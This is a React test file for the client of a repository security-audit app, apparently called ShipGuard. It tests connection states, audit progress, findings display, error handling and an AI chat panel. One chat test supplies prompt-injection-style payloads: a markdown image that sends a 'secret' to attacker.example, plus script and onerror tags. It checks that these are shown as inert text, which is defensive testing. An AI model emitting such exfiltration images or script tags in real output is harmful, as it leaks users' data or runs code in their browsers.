import {
  act,
  fireEvent,
  render,
  screen,
  waitFor,
  within
} from "@testing-library/react";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { AUDIT_ID, TARGET, detail, finding, stages, state } from "./fixtures";

// The Agents SDK hooks talk to a WebSocket, so they are replaced by fakes that
// the tests can drive: `hooks.opts` are the options the app passed to useAgent,
// and `hooks.results` decides what agent.call() returns.
const hooks = vi.hoisted(() => ({
  opts: undefined as
    | undefined
    | {
        onStateUpdate?: (s: unknown) => void;
        onOpen?: () => void;
        onClose?: () => void;
        name?: string;
      },
  calls: [] as Array<{ method: string; args: unknown[] }>,
  results: {} as Record<string, unknown>,
  messages: [] as unknown[],
  status: "ready"
}));

vi.mock("agents/react", () => ({
  useAgent: (opts: NonNullable<typeof hooks.opts>) => {
    hooks.opts = opts;
    return {
      call: async (method: string, args: unknown[] = []) => {
        hooks.calls.push({ method, args });
        const r = hooks.results[method];
        return typeof r === "function"
          ? (r as (...a: unknown[]) => unknown)(...args)
          : r;
      }
    };
  }
}));
vi.mock("@cloudflare/ai-chat/react", () => ({
  useAgentChat: () => ({
    messages: hooks.messages,
    status: hooks.status,
    sendMessage: vi.fn()
  })
}));

import { App } from "../../src/client/App";
import { ErrorBoundary } from "../../src/client/ErrorBoundary";

const summaryOf = (d = detail()) => ({
  id: d.id,
  target: d.target,
  sha: d.sha,
  status: d.status,
  aiStatus: d.aiStatus,
  createdAt: d.createdAt,
  counts: d.counts,
  headline: d.headline
});

// A function call, so TypeScript does not narrow the property after a local assignment.
const optsNow = () => hooks.opts;

async function connect(s = state()) {
  render(<App />);
  await act(async () => {
    hooks.opts?.onOpen?.();
    hooks.opts?.onStateUpdate?.(s);
  });
}

beforeEach(() => {
  hooks.opts = undefined;
  hooks.calls = [];
  hooks.results = { refresh: undefined, getAudit: undefined };
  hooks.messages = [];
  hooks.status = "ready";
});

describe("a brand-new workspace", () => {
  it("renders the empty state instead of crashing", async () => {
    await connect();
    expect(screen.getByText("No investigation yet")).toBeTruthy();
    expect(screen.getByText("Connected")).toBeTruthy();
    expect(screen.queryByText(/Something went wrong/)).toBeNull();
    expect(screen.getByText(/No audits yet/)).toBeTruthy();
  });

  it("renders before the connection opens and shows that it is connecting", async () => {
    render(<App />);
    expect(screen.getByText("Reconnecting…")).toBeTruthy();
    expect(screen.getByText(/Connecting to your workspace/)).toBeTruthy();
  });

  it("uses one workspace id for the connection and the URL", async () => {
    await connect();
    const id = optsNow()?.name;
    expect(id).toMatch(/^[0-9a-f-]{36}$/);
    expect(window.location.hash).toBe(`#w=${id}`);
  });

  it("returns to the same workspace when the page is reloaded", async () => {
    await connect();
    const first = optsNow()?.name;
    document.body.innerHTML = "";
    hooks.opts = undefined;
    window.location.hash = "";
    await connect();
    expect(optsNow()?.name).toBe(first);
  });

  it("shows when the connection drops", async () => {
    await connect();
    await act(async () => hooks.opts?.onClose?.());
    expect(screen.getByText("Reconnecting…")).toBeTruthy();
  });
});

describe("a running audit", () => {
  const running = () =>
    state({
      activeTarget: TARGET,
      running: {
        auditId: AUDIT_ID,
        target: TARGET,
        startedAt: new Date().toISOString(),
        stages: stages(3)
      }
    });

  it("shows each stage with its real status and detail", async () => {
    hooks.results.getAudit = detail({ status: "running", stages: stages(3) });
    await connect(running());
    const list = await screen.findByRole("list", {
      name: /Audit progress, 3 of 8 stages done/
    });
    const items = within(list).getAllByRole("listitem");
    expect(items).toHaveLength(8);
    expect(
      items.slice(0, 3).every((i) => i.getAttribute("data-status") === "done")
    ).toBe(true);
    expect(items[3].getAttribute("data-status")).toBe("pending");
    expect(within(items[0]).getByText("detail for resolve")).toBeTruthy();
  });

  it("updates as new state arrives, without a reload", async () => {
    hooks.results.getAudit = detail({ status: "running" });
    await connect(running());
    await screen.findByRole("list", { name: /3 of 8/ });
    await act(async () => {
      hooks.opts?.onStateUpdate?.({
        ...running(),
        running: { ...running().running!, stages: stages(6) }
      });
    });
    expect(
      await screen.findByRole("list", { name: /6 of 8 stages done/ })
    ).toBeTruthy();
  });

  it("disables starting another audit while one runs", async () => {
    await connect(running());
    const button = screen.getByRole("button", {
      name: /Audit running/
    }) as HTMLButtonElement;
    expect(button.disabled).toBe(true);
    expect(
      (
        screen.getByRole("button", {
          name: "Try the demo"
        }) as HTMLButtonElement
      ).disabled
    ).toBe(true);
  });
});

describe("a completed audit", () => {
  const complete = (d = detail()) => {
    hooks.results.getAudit = d;
    return state({ activeTarget: TARGET, recent: [summaryOf(d)] });
  };

  it("summarises severity with text, not just colour", async () => {
    await connect(complete());
    expect(await screen.findByText("1 finding: 1 high")).toBeTruthy();
    const counts = screen.getByLabelText("Findings by severity");
    expect(within(counts).getByText("High")).toBeTruthy();
    expect(screen.getByText(/Inspected 3 of 12 files/)).toBeTruthy();
    expect(screen.getByText(/were not inspected/)).toBeTruthy();
  });

  it("lists the finding with its id, location and a link pinned to the audited commit", async () => {
    await connect(complete());
    fireEvent.click(await screen.findByRole("tab", { name: /Findings \(1\)/ }));
    expect(screen.getByText("F-001")).toBeTruthy();
    expect(screen.getByText(/bound but never declared/)).toBeTruthy();
    const link = screen.getByRole("link", {
      name: "wrangler.jsonc:6"
    }) as HTMLAnchorElement;
    expect(link.href).toBe(
      `https://github.com/acme/worker/blob/${"a".repeat(40)}/wrangler.jsonc#L6`
    );
    expect(link.rel).toContain("noopener");
    expect(screen.getByText(/"class_name": "DeploymentAgent"/)).toBeTruthy();
  });

  it("dismisses a finding through the agent", async () => {
    hooks.results.setFindingStatus = true;
    await connect(complete());
    fireEvent.click(await screen.findByRole("tab", { name: /Findings/ }));
    fireEvent.click(screen.getByRole("button", { name: "Dismiss" }));
    await waitFor(() =>
      expect(hooks.calls.some((c) => c.method === "setFindingStatus")).toBe(
        true
      )
    );
    expect(
      hooks.calls.find((c) => c.method === "setFindingStatus")?.args
    ).toEqual(["F-001", "dismissed", undefined]);
  });

  it("marks findings as new, still present or resolved compared with the last audit", async () => {
    const still = finding({
      fingerprint: "R2:x",
      displayId: "F-002",
      title: "Still a problem"
    });
    const fixed = finding({
      fingerprint: "R3:y",
      displayId: "F-003",
      title: "Was fixed"
    });
    const d = detail({
      previousAuditId: "prev",
      findings: [finding(), still],
      resolved: [fixed],
      changes: {
        [finding().fingerprint]: "new",
        "R2:x": "persisting",
        "R3:y": "resolved"
      },
      counts: { critical: 0, high: 2, medium: 0, low: 0, info: 0 }
    });
    await connect(complete(d));
    fireEvent.click(await screen.findByRole("tab", { name: /Findings/ }));
    expect(screen.getAllByText("New").length).toBeGreaterThan(0);
    expect(screen.getAllByText("Still present").length).toBeGreaterThan(0);
    expect(screen.getByText("Was fixed")).toBeTruthy();
    expect(screen.getByText("Resolved since the previous audit")).toBeTruthy();
  });

  it("shows exactly what was and was not read on the Evidence tab", async () => {
    await connect(complete());
    fireEvent.click(await screen.findByRole("tab", { name: "Evidence" }));
    expect(screen.getByText("Whole file")).toBeTruthy();
    expect(screen.getByText("Part of file")).toBeTruthy();
    expect(
      screen.getByText(/Not read: GitHub did not answer in time/)
    ).toBeTruthy();
    expect(screen.getByText(".dev.vars")).toBeTruthy();
    expect(
      screen.getByText(/Secret-bearing files are never downloaded/)
    ).toBeTruthy();
  });

  it("says plainly when AI analysis was unavailable", async () => {
    await connect(
      complete(
        detail({
          aiStatus: "failed",
          aiNote: "The Workers AI allocation looks exhausted."
        })
      )
    );
    expect(await screen.findByText(/AI analysis was unavailable/)).toBeTruthy();
    expect(screen.getByText(/deterministic rules only/)).toBeTruthy();
  });

  it("does not present an empty result as proof of safety", async () => {
    await connect(
      complete(
        detail({
          findings: [],
          counts: { critical: 0, high: 0, medium: 0, low: 0, info: 0 },
          headline: "No findings",
          changes: {}
        })
      )
    );
    fireEvent.click(await screen.findByRole("tab", { name: /Findings/ }));
    expect(
      screen.getByText(
        /does not prove the rest of the project is free of problems/
      )
    ).toBeTruthy();
  });

  it("supports arrow-key navigation between tabs", async () => {
    await connect(complete());
    const first = await screen.findByRole("tab", { name: "Summary" });
    first.focus();
    fireEvent.keyDown(first, { key: "ArrowRight" });
    expect(
      screen
        .getByRole("tab", { name: /Findings/ })
        .getAttribute("aria-selected")
    ).toBe("true");
    fireEvent.keyDown(screen.getByRole("tab", { name: /Findings/ }), {
      key: "End"
    });
    expect(
      screen.getByRole("tab", { name: "Actions" }).getAttribute("aria-selected")
    ).toBe("true");
  });
});

describe("failures are visible and useful", () => {
  it("explains a failed audit and offers to retry", async () => {
    const d = detail({
      status: "failed",
      headline: "Audit failed",
      findings: [],
      counts: { critical: 0, high: 0, medium: 0, low: 0, info: 0 },
      error: {
        code: "NOT_FOUND",
        message: "The repository was not found or is private."
      },
      stages: stages(1, { failedAt: 1 })
    });
    hooks.results.getAudit = d;
    await connect(state({ activeTarget: TARGET, recent: [summaryOf(d)] }));
    expect(await screen.findByText(/could not be completed/)).toBeTruthy();
    expect(screen.getByText(/not found or is private/)).toBeTruthy();
    expect(screen.getByRole("button", { name: "Try again" })).toBeTruthy();
  });

  it("shows the reason a submitted URL was rejected, next to the field", async () => {
    hooks.results.startAudit = {
      ok: false,
      error: {
        code: "INVALID_URL",
        message: "Only https:// URLs are accepted."
      }
    };
    await connect();
    const input = screen.getByLabelText(
      "Audit a repository"
    ) as HTMLInputElement;
    fireEvent.change(input, { target: { value: "http://github.com/o/r" } });
    fireEvent.click(screen.getByRole("button", { name: "Run audit" }));
    const alert = await screen.findByRole("alert");
    expect(alert.textContent).toContain("Only https:// URLs are accepted.");
    expect(input.getAttribute("aria-invalid")).toBe("true");
  });

  it("survives a failure to load audit details", async () => {
    hooks.results.getAudit = () => Promise.reject(new Error("boom"));
    const d = detail();
    await connect(state({ activeTarget: TARGET, recent: [summaryOf(d)] }));
    expect(await screen.findByText(/Could not load this audit/)).toBeTruthy();
  });

  it("falls back to a reload prompt if rendering ever fails", () => {
    const spy = vi.spyOn(console, "error").mockImplementation(() => undefined);
    const Boom = () => {
      throw new Error("render bug");
    };
    render(
      <ErrorBoundary>
        <Boom />
      </ErrorBoundary>
    );
    expect(
      screen.getByText(/Something went wrong showing this page/)
    ).toBeTruthy();
    expect(screen.getByRole("button", { name: "Reload" })).toBeTruthy();
    spy.mockRestore();
  });
});

describe("conversation", () => {
  const msg = (id: string, role: "user" | "assistant", text: string) => ({
    id,
    role,
    parts: [{ type: "text", text }]
  });

  it("shows both sides of the conversation", async () => {
    hooks.messages = [
      msg("1", "user", "Did we fix F-001?"),
      msg("2", "assistant", "**Yes.** F-001 is gone.")
    ];
    await connect();
    expect(screen.getByText("Did we fix F-001?")).toBeTruthy();
    expect(screen.getByText("Yes.").tagName).toBe("STRONG");
  });

  it("renders model output as text only: no images, no links, no markup", async () => {
    hooks.messages = [
      msg(
        "1",
        "assistant",
        '![leak](https://attacker.example/?q=secret) [click](https://attacker.example/x) <img src=x onerror="alert(1)"> <script>alert(2)</script>'
      )
    ];
    const { container } = render(<App />);
    await act(async () => hooks.opts?.onOpen?.());
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector('a[href*="attacker"]')).toBeNull();
    // The characters are still visible, as inert text.
    expect(container.textContent).toContain("<script>alert(2)</script>");
    expect(container.textContent).toContain(
      "click (https://attacker.example/x)"
    );
  });

  it("keeps the input labelled and limits its length", async () => {
    await connect();
    const box = screen.getByLabelText(
      "Message ShipGuard"
    ) as HTMLTextAreaElement;
    expect(box.maxLength).toBe(4000);
    expect(box.disabled).toBe(false);
  });

  it("does not let you type into the chat before the connection is open", () => {
    render(<App />);
    expect(
      (screen.getByLabelText("Message ShipGuard") as HTMLTextAreaElement)
        .disabled
    ).toBe(true);
  });
});
